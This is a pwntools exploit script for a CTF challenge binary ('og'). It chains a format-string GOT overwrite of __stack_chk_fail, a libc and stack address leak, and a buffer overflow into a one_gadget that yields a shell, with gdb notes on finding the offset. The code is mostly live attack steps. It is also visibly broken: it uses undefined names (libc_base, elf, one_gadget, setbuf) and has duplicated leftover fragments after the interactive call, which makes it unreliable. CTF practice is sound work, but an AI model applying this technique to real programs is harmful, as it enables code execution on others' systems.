
from pwn import *
from pwn import p64

# run pwninit
exe = ELF("./og_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.terminal = ["tmux", "splitw", "-h"]
context.binary = exe

def conn():
    if args.REMOTE:
        r = remote("challs.actf.co", 31312)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(
                    r,
                    gdbscript='''
                        b *go+163
                        b *go+169
                    ''')

    return r

r = conn()


# ROPgadget --binary og_patched | grep "ret"
ret = 0x40101a # ret

"""
gdb og_patched
disass go
b *go+123 // before the fgets
n
%p %p %p %p %p %p %p %p %p %p 
Gotta go. See you around, 
0x7fffffffbc80 (nil) 0x7ffff7ea6887 0x1a (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025207025 (nil)

from go
# can see that the address of the buffer is at [rbp-0x30]

0x00000000004011fc <+102>:   call   0x401090 <printf@plt>
0x0000000000401201 <+107>:   mov    rdx,QWORD PTR [rip+0x2e68]        # 0x404070 <stdin@GLIBC_2.2.5>
0x0000000000401208 <+114>:   lea    rax,[rbp-0x30]
0x000000000040120c <+118>:   mov    esi,0x42
0x0000000000401211 <+123>:   mov    rdi,rax
0x0000000000401214 <+126>:   call   0x4010a0 <fgets@plt>

info reg -> to find out address of rbp
rbp            0x7fffffffdde0

(gdb) x/64x 0x7fffffffdde0 -0x40
0x7fffffffdda0: 0x25207025      0x70252070      0x20702520      0x25207025
0x7fffffffddb0: 0x70252070      0x20702520      0x25207025      0x00000a70
0x7fffffffddc0: 0x00000000      0x00000000      0x0898bf00      0x73b631cc

can see that the buffer address starts from the 6th %p


"""

# when stack smashing happens, return instead, set up for the buffer overflows later




# libc_base = 0x0


payload3 = fmtstr_payload(6, { libc_base + libc.sym.fgets : libc_base+libc.sym.gets}).ljust(0x40, b'\x0')


# payload = fmtstr_payload(6, { libc_base + libc.sym.setbuf : libc_base+libc.sym.system, libc_base + libc.sym.stdin : b"sh\0" })



# payload4 = fmtstr_payload(6, { libc_base + libc.sym.stdin : b"sh\0" }).ljust(0x40, b'\0')


payload = fmtstr_payload(6, { exe.got.__stack_chk_fail : ret }, write_size='short')
payload += b"\0" * (0x38 - len(payload)) + p64(exe.sym.go + 5)


payload = fmtstr_payload(6, { elf.got.__stack_chk_fail : ret }, write_size='short')
payload += b"\0" * (0x38 - len(payload)) + p64(exe.sym.go + 5)

r.sendlineafter(b"name: ", payload)


# libc leak



payload = (b'%7$sAAAA' + p64(exe.got.printf)).ljust(0x40, b'\x0')

# r.sendline(b'%7$sAAAA' + p64(0x404028) + b"A"*24)
payload = b"%33$p %17$p leak"
payload += b"\0" * (0x38 - len(payload)) + p64(exe.sym.go + 5)
r.sendlineafter(b"name: ", payload)

r.recvuntil(b"See you around, ")
[libc_leak, stack_leak] = [int(leak, 16) for leak in r.recvuntil(b" leak").split(b" ")[:-1]]
libc_leak -= 0x29e40
stack_leak += 0x78
log.info(hex(libc_leak))

libc.address = libc_leak

# Buffer overflow
# 0xebc81 is the one_gadget
payload = b"\0" * 0x30 + p64(stack_leak) + p64(libc.address + 0xebc81)
r.sendlineafter(b"name: ", payload)

r.interactive()



# payload = fmtstr_payload(11, {setbuf: lower16}, write_size='short')


package = {
    one_gadget & 0xffff: setbuf,
    one_gadget >> 16 & 0xffff: setbuf + 2
}
print(package)
order = sorted(package)
print(order)

pay = f'%{order[0]}c%11$hn'.encode()
pay += f'%{order[1] - order[0]}c%12$hn'.encode()
pay = pay.ljust(40, b'x')
pay += p64(package[order[0]])
pay += p64(package[order[1]])




package = {
    one_gadget & 0xffff: setbuf,
    one_gadget >> 16 & 0xffff: setbuf + 2
}
order = sorted(package)

pay = f'%{order[0]}c%11$hn'.encode()
pay += f'%{order[1] - order[0]}c%12$hn'.encode()
pay = pay.ljust(40, b'x')
pay += p64(package[order[0]])
pay += p64(package[order[1]])